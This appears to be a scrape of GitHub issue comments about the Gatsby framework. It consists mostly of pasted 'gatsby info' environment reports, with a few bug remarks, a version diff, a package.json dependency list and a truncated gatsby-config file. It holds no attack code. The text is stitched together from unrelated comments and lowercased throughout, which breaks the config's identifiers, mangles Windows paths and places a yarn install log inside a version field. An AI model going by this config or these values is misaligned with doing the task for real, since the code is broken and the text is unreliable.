linux mint 19.3 nodejs v12.12.0 npm 6.14.4 please find log file attached, thank you
[2020-08-13t18_16_29_421z-debug.log](
``` system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - ~/.nvm/versions/node/v14.4.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.4.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 safari: 13.1.2 npmpackages: gatsby: ^2.24.15 => 2.24.15 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-catch-links: ^2.3.11 => 2.3.11 gatsby-plugin-hotjar: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.4.21 => 2.4.21 gatsby-plugin-netlify: ^2.3.11 => 2.3.11 gatsby-plugin-offline: ^3.2.21 => 3.2.21 gatsby-plugin-react-helmet-async: ^1.0.17-0 => 1.0.17-0 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-segment-js: ^3.3.0 => 3.3.0 gatsby-plugin-sharp: ^2.6.24 => 2.6.24 gatsby-plugin-sitemap: ^2.4.11 => 2.4.11 gatsby-remark-images: ^3.3.23 => 3.3.25 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-contentful: ^2.3.34 => 2.3.37 gatsby-source-filesystem: ^2.3.23 => 2.3.24 gatsby-transformer-remark: ^2.8.27 => 2.8.28 gatsby-transformer-sharp: ^2.5.12 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.66
using `gatsby-source-prismic-graphql` to source data
also happens with `@prismicio/gatsby-source-prismic-graphql`
```sh system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.17.0 - ~/.nvm/versions/node/v12.17.0/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.17.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: 2.24.43 => 2.24.43 gatsby-source-prismic-graphql: 3.6.2 => 3.6.2 ```
kresimircosic@kresimircosic:/var/www/projects/hello-world$ gatsby info --clipboard system: os: linux 5.4 pop!_os 20.04 lts cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.0.17 - /bin/bash binaries: node: 12.18.3 - /usr/bin/node npm: 6.14.7 - ~/.npm-global/bin/npm browsers: chrome: 84.0.4147.125 firefox: 79.0 npmpackages: gatsby: ^2.24.41 => 2.24.41 npmglobalpackages: gatsby-cli: 2.12.87
``` system: os: linux 4.19 ubuntu 20.04.1 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i5-6300u cpu @ 2.40ghz shell: 5.0.17 - /bin/bash binaries: node: 12.18.1 - ~/.nvm/versions/node/v12.18.1/bin/node npm: 6.14.7 - ~/.nvm/versions/node/v12.18.1/bin/npm languages: python: 3.8.2 - /usr/bin/python npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-cli: ^2.12.87 => 2.12.87 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-source-filesystem: ^2.3.19 => 2.3.24 gatsby-transformer-remark: ^2.8.25 => 2.8.28 npmglobalpackages: gatsby-cli: 2.12.84
firefox, chrome
- online at: gatsbyjs.com ### note: from the org the redirect is working:
production website
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-4260u cpu @ 1.40ghz shell: 3.2.57 - /bin/bash binaries: node: 10.17.0 - ~/.nvm/versions/node/v10.17.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v10.17.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.41 => 2.24.41 gatsby-image: ^2.4.15 => 2.4.15 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.26 => 2.6.26 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.12 => 2.5.12
``` system: os: windows 10 10.0.19041 cpu: (4) x64 intel(r) core(tm) i3-8100 cpu @ 3.60ghz binaries: node: 10.21.0 - c:\\program files\ odejs\ ode.exe npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 44.19041.1.0 npmpackages: gatsby: ^2.20.29 => 2.24.4 gatsby-paginate: ^1.0.17 => 1.0.17 gatsby-plugin-feed: ^2.0.11 => 2.1.0 gatsby-plugin-google-analytics: ^2.0.18 => 2.0.18 gatsby-plugin-google-tagmanager: ^2.0.8 => 2.0.12 gatsby-plugin-manifest: ^2.0.13 => 2.0.26 gatsby-plugin-nprogress: ^2.0.7 => 2.0.10 gatsby-plugin-offline: ^2.0.21 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.5 => 3.0.11 gatsby-plugin-react-leaflet: ^2.0.11 => 2.0.11 gatsby-plugin-sass: ^2.0.7 => 2.0.11 gatsby-plugin-sharp: ^2.0.18 => 2.0.32 gatsby-plugin-sitemap: ^2.0.4 => 2.0.11 gatsby-remark-autolink-headers: ^2.0.16 => 2.0.16 gatsby-remark-figure-caption: ^2.0.0 => 2.0.0 gatsby-remark-images: ^3.0.1 => 3.0.10 gatsby-remark-katex: ^3.0.4 => 3.0.4 gatsby-remark-prismjs: ^3.2.8 => 3.2.8 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-remark-responsive-iframe: ^2.2.21 => 2.2.21 gatsby-source-filesystem: ^2.3.20 => 2.3.20 gatsby-transformer-remark: ^2.2.0 => 2.3.8 gatsby-transformer-sharp: ^2.1.12 => 2.1.17 npmglobalpackages: gatsby-cli: 2.12.62
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i5-8300h cpu @ 2.30ghz binaries: node: 10.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.6 - c:\\program files\ odejs\ pm.cmd browsers: chrome: 84.0.4147.105 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.23.12 => 2.23.12 npmglobalpackages: gatsby-cli: 2.12.85
i can't run any gatsby commands as i get this
bash: /c/users/joelr/appdata/roaming/npm/gatsby: permission denied
but im running on windows 10
system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - ~/.nvm/versions/node/v12.18.3/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.14.6 - ~/.nvm/versions/node/v12.18.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 74.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.43 => 2.24.43 gatsby-image: ^2.4.15 => 2.4.15 gatsby-link: ^2.4.11 => 2.4.13 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.2.39 => 2.4.22 gatsby-plugin-modal-routing: ^1.1.0 => 1.2.0 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.1.21 => 3.3.10 gatsby-plugin-sass: ^2.3.4 => 2.3.12 gatsby-plugin-sharp: ^2.6.26 => 2.6.26 gatsby-plugin-sitemap: ^2.4.3 => 2.4.11 gatsby-plugin-styled-components: ^3.2.3 => 3.3.10 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-contentful: ^2.3.36 => 2.3.36 gatsby-source-filesystem: ^2.1.46 => 2.3.24 gatsby-transformer-plaintext: ^1.0.0 => 1.0.0 gatsby-transformer-sharp: ^2.3.13 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.68
` ### reference as asked by @pieh there is the whole discussion thank you in advance for your hard work !
``` system: os: linux 4.19 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (6) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 4.4.12 - /bin/bash binaries: node: 14.3.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.23.12 => 2.24.24 gatsby-image: ^2.4.9 => 2.4.14 gatsby-plugin-manifest: ^2.4.18 => 2.4.21 gatsby-plugin-offline: ^3.2.13 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.10 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.14 => 2.6.24 gatsby-source-filesystem: ^2.3.14 => 2.3.23 gatsby-source-graphql: ^2.6.1 => 2.6.2 gatsby-transformer-sharp: ^2.5.7 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.59
system: os: macos mojave 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 10.13.0 - /usr/local/bin/node yarn: yarn install v0.27.5
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
done in 53.64s
- /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 77.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.22.0 => 2.22.0 gatsby-awesome-pagination: ^0.3.6 => 0.3.6 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-asset-path: ^3.0.2 => 3.0.2 gatsby-plugin-google-tagmanager: ^2.3.11 => 2.3.11 gatsby-plugin-lodash: ^3.3.1 => 3.3.1 gatsby-plugin-netlify: ^2.3.2 => 2.3.2 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-remote-images: ^2.1.0 => 2.1.0 gatsby-plugin-sass: ^2.3.1 => 2.3.1 gatsby-plugin-sharp: ^2.6.6 => 2.6.6 gatsby-remark-images: ^3.3.5 => 3.3.5 gatsby-source-filesystem: ^2.3.18 => 2.3.18 gatsby-source-wordpress: ^3.3.5 => 3.3.5 gatsby-transformer-remark: ^2.8.10 => 2.8.10 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 gatsby-wordpress-reading-time: ^1.0.4 => 1.0.4 npmglobalpackages: gatsby-cli: 2.8.29
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-5200u cpu @ 2.20ghz binaries: node: 12.18.3 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.6 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 browsers: chrome: 84.0.4147.105 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.24.37 => 2.24.37 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-offline: ^3.2.22 => 3.2.22 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.25 => 2.6.25 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.82
this is a test run through circleci so i'm not sure of the environment
however, here is one of the [circleci logs]( for a failed `starters_validate` test.
- `using-i18n`: ```zsh system: os: linux 5.7 endeavouros cpu: (16) x64 amd ryzen 7 2700x eight-core processor shell: 5.8 - /bin/zsh binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 79.0 npmpackages: gatsby: 2.24.37 => 2.24.37 gatsby-link: ^2.4.13 => 2.4.13 gatsby-plugin-i18n: ^1.0.1 => 1.0.1 gatsby-plugin-mdx: ^1.2.34 => 1.2.34 gatsby-plugin-no-javascript: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-json: ^2.4.11 => 2.4.11 npmglobalpackages: gatsby-cli: 2.12.82
``` - updated `gatsby-starter-default`: ```zsh system: os: linux 5.7 endeavouros cpu: (16) x64 amd ryzen 7 2700x eight-core processor shell: 5.8 - /bin/zsh binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 79.0 npmpackages: gatsby: ^2.24.37 => 2.24.37 gatsby-image: ^2.4.14 => 2.4.15 gatsby-link: ^2.4.13 => 2.4.13 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-mdx: ^1.2.34 => 1.2.34 gatsby-plugin-no-javascript: ^2.0.5 => 2.0.5 gatsby-plugin-offline: ^3.2.22 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.25 => 2.6.26 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-json: ^2.4.11 => 2.4.11 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.82
``` i downgraded `gatsby-starter-default` and it worked
but the updated and original `gatsby-starter-default` (if you can not distinguish the versions, see below): ```zsh
system: os: linux 5.7 endeavouros cpu: (16) x64 amd ryzen 7 2700x eight-core processor shell: 5.8 - /bin/zsh binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 79.0 npmpackages: gatsby: ^2.24.37 => 2.24.37 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-offline: ^3.2.22 => 3.2.22 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.25 => 2.6.25 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.82
``` compare `gatsby-starter-default` updated from `npm` with original `gatsby-starter-default`: ```diff
--- test-gus.txt 2020-08-11 03:20:50.049995197 -0300
+++ test-i8.txt 2020-08-11 03:21:03.077855134 -0300
@@ -12,16 +12,12 @@ firefox: 79.0 npmpackages: gatsby: ^2.24.37 => 2.24.37
- gatsby-image: ^2.4.14 => 2.4.15
- gatsby-link: ^2.4.13 => 2.4.13
+ gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-manifest: ^2.4.22 => 2.4.22
- gatsby-plugin-mdx: ^1.2.34 => 1.2.34
- gatsby-plugin-no-javascript: ^2.0.5 => 2.0.5
- gatsby-plugin-offline: ^3.2.22 => 3.2.23
+ gatsby-plugin-offline: ^3.2.22 => 3.2.22 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10
- gatsby-plugin-sharp: ^2.6.25 => 2.6.26
+ gatsby-plugin-sharp: ^2.6.25 => 2.6.25 gatsby-source-filesystem: ^2.3.24 => 2.3.24
- gatsby-transformer-json: ^2.4.11 => 2.4.11 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.82
\\ sem newline no fim do ficheiro
```bash system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.40 => 2.24.40 gatsby-image: ^2.4.15 => 2.4.15 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-sharp: ^2.6.26 => 2.6.26 gatsby-source-prismic: ^3.2.1 => 3.2.1 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.29
``` system: os: linux 5.7 fedora 32 (workstation edition) 32 (workstation edition) cpu: (8) x64 intel(r) core(tm) i5-8265u cpu @ 1.60ghz shell: 5.0.17 - /bin/bash binaries: node: 12.16.3 - /usr/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - /usr/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 79.0 npmpackages: gatsby: ^2.24.39 => 2.24.39 gatsby-cli: ^2.12.81 => 2.12.81 gatsby-remark-responsive-iframe: ^2.4.12 => 2.4.12 gatsby-theme-carbon: ^1.26.7 => 1.26.7 npmglobalpackages: gatsby-cli: 2.12.81
system: os: macos 10.15.5 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.7.0 - ~/.nvm/versions/node/v13.7.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.6 - ~/.nvm/versions/node/v13.7.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 safari: 13.1.1 npmpackages: gatsby: ^2.21.21 => 2.24.11 gatsby-image: ^2.2.29 => 2.4.13 gatsby-plugin-google-analytics: ^2.0.13 => 2.3.13 gatsby-plugin-layout: ^1.0.11 => 1.3.10 gatsby-plugin-manifest: ^2.2.23 => 2.4.21 gatsby-plugin-offline: ^3.0.16 => 3.2.21 gatsby-plugin-react-helmet: ^3.1.13 => 3.3.10 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.3.1 => 2.3.12 gatsby-plugin-sharp: ^2.2.32 => 2.6.22 gatsby-source-filesystem: ^2.1.33 => 2.3.23 gatsby-source-shopify: ^3.2.26 => 3.2.26 gatsby-transformer-sharp: ^2.3.0 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.37
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.17.0 - ~/.nvm/versions/node/v12.17.0/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.17.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 78.0.2 safari: 13.1.2 npmpackages: gatsby: ^2.24.26 => 2.24.26 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.4.21 => 2.4.21 gatsby-plugin-offline: ^3.2.21 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.24 => 2.6.24 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 ```
system: os: windows 10 10.0.19041 cpu: (8) x64 intel(r) core(tm) i7-4790k cpu @ 4.00ghz binaries: node: 12.13.0 - c:\\program files\ odejs\ ode.exe yarn: 1.17.3 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.7 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.19041.1.0 npmpackages: gatsby: ^2.24.26 => 2.24.26 gatsby-source-graphql: 2.7.0 => 2.7.0 npmglobalpackages: gatsby-cli: 2.12.62
``` system: os: linux 5.7 arch linux cpu: (16) x64 amd ryzen 7 3800x 8-core processor shell: 5.8 - /usr/bin/zsh binaries: node: 12.16.1 - /tmp/yarn--1596878937010-0.33041929112915125/node yarn: 1.22.4 - /tmp/yarn--1596878937010-0.33041929112915125/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 3.8.5 - /usr/bin/python browsers: firefox: 79.0 npmpackages: gatsby: ^2.24.36 => 2.24.36 gatsby-plugin-canonical-urls: ^2.3.4 => 2.3.4 gatsby-plugin-catch-links: ^2.1.25 => 2.3.5 gatsby-plugin-favicons: ^1.0.4 => 1.0.4 gatsby-plugin-git-clone: ^0.1.0 => 0.1.0 gatsby-plugin-matomo: ^0.8.0 => 0.8.3 gatsby-plugin-mdx: ^1.2.34 => 1.2.34 gatsby-plugin-react-helmet-async: ^1.0.15 => 1.0.16 gatsby-plugin-s3: ^0.3.3 => 0.3.3 gatsby-plugin-sharp: ^2.4.5 => 2.6.11 gatsby-plugin-sitemap: ^2.2.27 => 2.4.5 gatsby-plugin-styled-components: ^3.1.19 => 3.3.4 gatsby-plugin-ts-config: ^0.2.3 => 0.2.3 gatsby-plugin-typescript: ^2.4.6 => 2.4.6 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.1.44 => 3.3.10 gatsby-remark-static-images: ^1.2.1 => 1.2.1 gatsby-source-filesystem: ^2.3.0 => 2.3.11 gatsby-transformer-yaml: ^2.2.25 => 2.4.4
system: os: windows server 2016 10.0.14393 cpu: (2) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz binaries: node: 12.15.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd npmpackages: gatsby: ^2.23.12 => 2.24.36 gatsby-cli: ^2.12.67 => 2.12.79 gatsby-plugin-create-client-paths: ^2.3.10 => 2.3.10 gatsby-plugin-ts-config: ^0.2.3 => 0.2.3 gatsby-source-filesystem: ^2.3.23 => 2.3.24 gatsby-transformer-remark: ^2.8.27 => 2.8.28 npmglobalpackages: gatsby-cli: 2.12.60
i see the same issue locally
``` system: os: linux 5.6 manjaro linux cpu: (12) x64 intel(r) core(tm) i7-10710u cpu @ 1.10ghz shell: 3.1.2 - /usr/bin/fish binaries: node: 10.21.0 - ~/.nvm/versions/node/v10.21.0/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v10.21.0/bin/npm languages: python: 3.8.3 - /bin/python browsers: chrome: 83.0.4103.116
``` system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - ~/.nvm/versions/node/v14.4.0/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.4.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.34 => 2.24.34 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-google-tagmanager: ^2.3.11 => 2.3.11 gatsby-plugin-manifest: ^2.4.22 => 2.4.22 gatsby-plugin-material-ui: ^2.1.10 => 2.1.10 gatsby-plugin-node-reload: ^1.1.0 => 1.1.0 gatsby-plugin-offline: ^3.2.22 => 3.2.22 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-leaflet: ^2.0.13 => 2.0.13 gatsby-plugin-remote-images: ^2.2.0 => 2.2.0 gatsby-plugin-s3: ^0.3.3 => 0.3.4 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.25 => 2.6.25 gatsby-plugin-typegen: ^2.2.1 => 2.2.1 gatsby-plugin-typescript: ^2.4.15 => 2.4.17 gatsby-plugin-typescript-checker: ^1.1.1 => 1.1.1 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-source-graphql: ^2.7.0 => 2.7.0 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.77
``` ### dependencies
"dependencies": { "@date-io/date-fns": "^1.3.13", "@material-ui/core": "^4.10.2", "@material-ui/icons": "^4.9.1", "@material-ui/lab": "^4.0.0-alpha.56", "@material-ui/pickers": "^3.2.10", "@react-hook/throttle": "^2.2.0", "axios": "^0.19.2", "babel-preset-react-app": "^9.1.1", "classnames": "^2.2.6", "date-fns": "^2.15.0", "date-fns-timezone": "^0.1.4", "deepmerge": "^4.2.2", "dompurify": "^2.0.11", "elasticsearch-browser": "^16.7.1", "gatsby": "^2.24.34", "gatsby-background-image": "^1.1.1", "gatsby-image": "^2.4.14", "gatsby-plugin-google-tagmanager": "^2.3.11", "gatsby-plugin-manifest": "^2.4.22", "gatsby-plugin-material-ui": "^2.1.10", "gatsby-plugin-node-reload": "^1.1.0", "gatsby-plugin-offline": "^3.2.22", "gatsby-plugin-react-helmet": "^3.3.10", "gatsby-plugin-react-leaflet": "^2.0.13", "gatsby-plugin-remote-images": "^2.2.0", "gatsby-plugin-s3": "^0.3.3", "gatsby-plugin-sass": "^2.3.12", "gatsby-plugin-sharp": "^2.6.25", "gatsby-plugin-typegen": "^2.2.1", "gatsby-plugin-typescript": "^2.4.15", "gatsby-plugin-typescript-checker": "^1.1.1", "gatsby-source-filesystem": "^2.3.24", "gatsby-source-graphql": "^2.7.0", "gatsby-transformer-sharp": "^2.5.12", "leaflet": "^1.6.0", "node-sass": "^4.14.1", "react": "^16.13.0", "react-dom": "^16.13.0", "react-helmet": "^6.1.0", "react-intl": "^5.4.6", "react-leaflet": "^2.7.0", "react-player": "^2.5.0", "slugify": "^1.4.5", "yup": "^0.29.3"
"devdependencies": { "@formatjs/cli": "^2.3.1", "@octokit/core": "^3.1.2", "@octokit/plugin-retry": "^3.0.3", "@octokit/rest": "^18.0.1", "@storybook/addon-actions": "^5.3.19", "@storybook/addon-info": "^5.3.19", "@storybook/addon-knobs": "^5.3.19", "@storybook/addon-links": "^5.3.19", "@storybook/addon-viewport": "^5.3.19", "@storybook/addons": "^5.3.19", "@storybook/react": "^5.3.19", "@types/classnames": "^2.2.10", "@types/dompurify": "^2.0.3", "@types/geojson": "^7946.0.7", "@types/jest": "^26.0.9", "@types/leaflet": "^1.5.16", "@types/react": "^16.9.44", "@types/react-dom": "^16.9.7", "@types/react-helmet": "^6.1.0", "@types/react-leaflet": "^2.5.1", "@types/yup": "^0.29.4", "@typescript-eslint/eslint-plugin": "^3.8.0", "babel-loader": "^8.0.6", "env-cmd": "^10.1.0", "eslint": "^7.6.0", "eslint-config-airbnb-typescript": "^9.0.0", "eslint-config-prettier": "^6.11.0", "eslint-loader": "^4.0.2", "eslint-plugin-import": "^2.21.2", "eslint-plugin-jsx-a11y": "^6.3.1", "eslint-plugin-prettier": "^3.1.4", "eslint-plugin-react": "^7.20.5", "eslint-plugin-react-hooks": "^4.0.8", "gatsby-plugin-eslint": "^2.0.8", "husky": "^4.2.3", "lint-staged": "^10.2.11", "minimist": "^1.2.3", "prettier": "^2.0.5", "shelljs": "^0.8.4", "typescript": "^3.9.7"
``` ### gatsby-config ```
const activeenv = process.env.gatsby_active_env || process.env.node_env || 'development';
require('dotenv').config({ path: `.env.${activeenv}`,
}); module.exports = { pathprefix: '', // circleci artifacts prefix assetprefix: process.env.asset_prefix_url, sitemetadata: { title: 'title', description: 'description', author: '@autho', }, plugins: [ { resolve: 'gatsby-plugin-google-tagmanager', options: { id: process.env.gatsby_gtm_id, includeindevelopment: true, }, }, 'gatsby-plugin-typescript', 'gatsby-plugin-typescript-checker', 'gatsby-plugin-node-reload', { resolve: 'gatsby-plugin-typegen', options: { emitschema: { 'src/__generated__/gatsby-introspection.json': true, 'src/__generated__/gatsby-schema.graphql': true, }, emitplugindocuments: { 'src/__generated__/gatsby-plugin-documents.graphql': true, }, }, }, { resolve: 'gatsby-source-graphql', options: { // arbitrary name for the remote schema query type typename: 'gateway', // field under which the remote schema will be accessible
you'll use this in your gatsby query fieldname: 'gateway', // url to query from url: process.env.gatsby_graphql_api, }, }, { resolve: 'gatsby-plugin-react-leaflet', options: { linkstyles: true, // (default: true) enable/disable loading stylesheets via cdn }, }, { resolve: 'gatsby-plugin-eslint', options: { test: /\\.js$|\\.jsx$|\\.ts$|\\.tsx$/, exclude: /(node_modules|.cache|public)/, stages: ['develop'], options: { emitwarning: true, failonerror: true, }, }, }, 'gatsby-plugin-sass', 'gatsby-plugin-react-helmet', 'gatsby-plugin-material-ui-theme-provider', // custom plugin { resolve: 'gatsby-plugin-material-ui', options: { stylesprovider: { injectfirst: true, }, }, }, { resolve: 'gatsby-source-s3-asset', options: { accesskeyid: process.env.gatsby_aws_access_key, secretaccesskey: 